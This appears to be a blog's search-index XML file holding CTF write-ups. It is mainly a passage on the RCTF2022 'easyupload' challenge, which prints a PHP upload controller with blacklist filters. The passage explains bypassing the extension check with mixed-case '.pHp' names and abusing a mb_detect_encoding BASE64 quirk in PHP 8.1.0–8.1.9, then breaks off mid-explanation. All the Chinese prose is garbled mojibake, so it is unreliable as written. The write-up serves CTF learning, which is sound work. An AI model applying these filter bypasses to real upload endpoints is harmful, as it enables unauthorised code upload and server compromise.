<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¼ºç½‘æ‹Ÿæ€2022-wp</title>
      <link href="/2023/02/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022-wp/"/>
      <url>/2023/02/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ‹Ÿæ€2022"><a href="#å¼ºç½‘æ‹Ÿæ€2022" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€2022"></a>å¼ºç½‘æ‹Ÿæ€2022</h1><h2 id="WHOYOUARE"><a href="#WHOYOUARE" class="headerlink" title="WHOYOUARE"></a>WHOYOUARE</h2><h2 id="NoRCE"><a href="#NoRCE" class="headerlink" title="NoRCE"></a>NoRCE</h2>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2022</title>
      <link href="/2023/02/13/RCTF2022-wp/"/>
      <url>/2023/02/13/RCTF2022-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="RCTF2022"><a href="#RCTF2022" class="headerlink" title="RCTF2022"></a>RCTF2022</h1><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><blockquote><p>é™„ä»¶</p><p><a href="https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar">https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar</a></p></blockquote><p><img src="/2023/02/13/RCTF2022-wp/image-20230122145933429.png" alt="image-20230122145933429"></p><p>è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œé¢˜ç›®å¼€å§‹ç»™å‡ºäº†é¢˜ç›®é™„ä»¶ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æºç æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶è¿‡æ»¤å“ªäº›ä¸œè¥¿</p><p>æ ¸å¿ƒå°±æ˜¯ä¸€ä¸ª<code>UploadController.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Filesystem</span>\<span class="title">Path</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalid</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;error occurs: <span class="subst">$msg</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[Route</span>(<span class="string">&#x27;/&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;upload&#x27;</span>)<span class="meta">]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadHtml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">                <span class="comment">//&#x27;&lt;p&gt;Before start you should know that it\&#x27;s not a good challenge.You can\&#x27;t get anything from this challenge.If you hate this challenge, just skip plz. &lt;/p&gt;&lt;p&gt;è¿™é“é¢˜å¹¶ä¸æ˜¯ä¸€é“å¥½é¢˜ï¼Œä½ ä¸ä¼šä»è¿™é“é¢˜ä¸Šè·å¾—ä»»ä½•ä¸œè¥¿ã€‚å¦‚æœä½ è®¨åŒè¿™é“é¢˜å°±ç›´æ¥è·³è¿‡å§ã€‚&lt;/p&gt;&#x27;</span></span><br><span class="line">                <span class="variable">$uploadHtml</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$ext</span> = <span class="title class_">Path</span>::<span class="title function_ invoke__">getExtension</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$request</span>-&gt;server-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload success&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤åŒ…å«äº†<code>åç¼€è¿‡æ»¤</code>å’Œ<code>æ–‡ä»¶å†…å®¹è¿‡æ»¤</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>åç¼€åé»‘åå•</strong>è¿‡æ»¤ä»£ç ï¼Œè¿‡æ»¤äº†<code>php,ini,phtml,htaccess</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">             <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è¿™é‡Œæ˜¯ç”¨<code>strstr()</code>è¿›è¡ŒåŒ¹é…ï¼Œè€Œ<code>strstr()</code>æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨<code>.pHp</code>ï¼Œæˆ–è€…<code>.PHP</code>è¿›è¡Œç»•è¿‡å¯¹<code>.php</code>çš„è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br></pre></td></tr></table></figure><p>ä»£ç æœ€åå¯ä»¥çœ‹åˆ°åç¼€åè¢«<code>strtolower()</code>å¤„ç†ï¼Œè½¬åŒ–ä¸ºå°å†™ï¼Œä½†æ˜¯è¿™é‡Œå·²ç»ä¸å½±å“ï¼Œå› ä¸ºå‰é¢å·²ç»ç»•è¿‡äº†è¿‡æ»¤</p></blockquote><blockquote><p><strong>æ–‡ä»¶å†…å®¹é»‘åå•</strong>æ˜ç¡®äº†<code>&quot;&lt;?&quot;, &quot;php&quot;, &quot;handler&quot;</code></p><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¯¹æ–‡ä»¶å†…å®¹çš„åˆ¤æ–­ï¼Œå…¶ä¸­æ¶‰åŠäº†<code>mb_detect_encoding()</code>å‡½æ•°</p><blockquote><p><code>mb_detect_encoding()</code>ï¼šä»æœ‰åºçš„å€™é€‰åˆ—è¡¨ä¸­ æ£€æµ‹å­—ç¬¦ä¸² æœ€å¯èƒ½çš„å­—ç¬¦ç¼–ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span>|<span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$encodings</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p><code>$strict</code>æ§åˆ¶åœ¨åˆ—å‡ºçš„ä»»ä½•ç¼–ç ä¸­å­—ç¬¦ä¸²æ— æ•ˆæ—¶çš„è¡Œä¸ºã€‚å¦‚æœ<code>strict</code>è®¾ç½®ä¸º<code>false</code>ï¼Œåˆ™è¿”å›æœ€æ¥è¿‘çš„åŒ¹é…ç¼–ç ;å¦‚æœ<code>strict</code>è®¾ç½®ä¸º<code>true</code>ï¼Œåˆ™è¿”å›<code>false</code>ã€‚</p><p>å½“<code>$encodings</code>çœç•¥æˆ–è€…ä¸ºç©ºæ—¶ï¼Œä¼šä»<code>mb_detect_order()</code>ä¸­æŒ‰é¡ºåºè¿›è¡Œæµ‹è¯•</p><p>è¯¥é¢˜ä»£ç ä¸­ä¸º<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">           <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                   <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„åˆ¤æ–­ä¸»è¦æ˜¯æœ‰ä¸ª<code>charset</code>çš„åˆ¤æ–­, å¦‚æœ <code>mb_detect_encoding()</code> çš„ç»“æœä¸ä¸ºç©ºã€<code>false !== $charset</code>ã€‘, å°±ä¼šå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ¤æ–­ï¼Œè€Œå½“ä¸ºç©ºæ—¶ã€<code>false == $charset</code>ã€‘ï¼Œå°±ä¼šç›´æ¥è¿”å›é€€å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä¸”åœ¨è¿™æ®µä»£ç ä¸­æœ‰æ˜¾ç¤ºï¼Œä¸ä»…éœ€è¦<code>$charset</code>ä¸ä¸ºç©ºï¼Œè¿˜éœ€è¦<code>$charset==&quot;BASE64&quot;</code></p><p>åˆ¤æ–­å®Œ<code>$charset</code>åï¼Œåˆå¯¹å†…å®¹è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå¦‚æœå‡ºç°ï¼Œå°±ä¼šå¤±è´¥äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨</p><p><img src="/2023/02/13/RCTF2022-wp/image-20230122163200935.png" alt="image-20230122163200935"></p><p>è¿™é‡ŒåŒ¹é…å†…å®¹çš„ä»£ç ä¸º<code>stristr($content, $v)!==false</code></p><p><strong>stristr</strong></p></blockquote><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><p><code>https://github.com/php/php-src/issues/9008</code></p><p>å®ƒä¼šå¯¼è‡´å¥‡æ€ªçš„ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"> <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"> <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"> <span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœå‘ç°</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure><p><code>mb_detect_encoding($string, null, true)</code>è¿”å›å€¼</p><p>åªæœ‰åœ¨<code>PHP</code>ç‰ˆæœ¬åœ¨<code>8.1.0 - 8.1.9</code>æ—¶ä¼šè¿”å›<code>base64</code>ï¼Œè€Œåœ¨å…¶ä»–ç‰ˆæœ¬éƒ½æ˜¯é»˜è®¤è¯†åˆ«ä¸º<code>ASCII</code></p><p>æŸ¥çœ‹è¿”å›åŒ…ä¸­æ•°æ®å¯çŸ¥</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 22 Jan 2023 08:40:35 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.54 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/8.1.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br></pre></td></tr></table></figure><p>æ­£å¥½æ˜¯<code>8.1.0 - 8.1.9</code>ç‰ˆæœ¬</p></blockquote><h4 id="libmbflæ‰“åˆ†"><a href="#libmbflæ‰“åˆ†" class="headerlink" title="libmbflæ‰“åˆ†"></a>libmbflæ‰“åˆ†</h4><blockquote><p>æ‰€ä»¥å®ç°&#96;&#96;$charset &#x3D;&#x3D; 